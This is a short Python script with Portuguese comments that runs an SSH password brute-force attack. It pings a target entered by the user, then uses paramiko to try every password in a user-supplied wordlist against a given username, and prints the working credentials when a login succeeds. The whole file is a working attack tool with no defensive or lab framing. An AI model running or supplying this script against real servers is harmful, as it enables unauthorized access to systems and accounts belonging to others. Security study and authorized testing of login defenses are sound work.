#!/usr/bin/python3

''' Programa que realiza brute force no protocolo SSH '''
import ping3
import socket
import paramiko

alvo = input('Digite o ip ou url do alvo: ')

def verificarAlvo(alvoAtaque):
	vivoMorto = ping3.ping(alvoAtaque)
	if vivoMorto:
		return True
	else:
		return False

resultadoVivoMorto = verificarAlvo(alvo)
def bruteForce(alvo):
	''' Cria um bloco para quebra de senha'''

	conexaoSsh = paramiko.SSHClient() # cria um cliente para o ssh

	usuarioSsh = input('Digite o usuario: ')
	listaPassword = input('Digite o nome da wordlist: ')
	conexaoSsh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # cria uma politica de segurança para o ssh

	'''Realiza o ataque de brute force '''
	with open(listaPassword) as filePassword:
		for senha in filePassword:
			senha = senha.strip()
			try :
				conexaoSsh.connect(alvo, username=usuarioSsh, password=senha) # tenta fazer uma conexão
				print(f'Conexão estabelecida username = {usuarioSsh} pass = {senha}')
				conexaoSsh.close() # finaliza a conexão apos o sucesso
				return # encerra a função
			except paramiko.AuthenticationException: # mensagem de erro caso não funcione
				print('Falha ao conectar!')

		print('Wordlist falhou! Tente outra')

if resultadoVivoMorto:
	bruteForce(alvo)

else:
	print('Não está acessível')
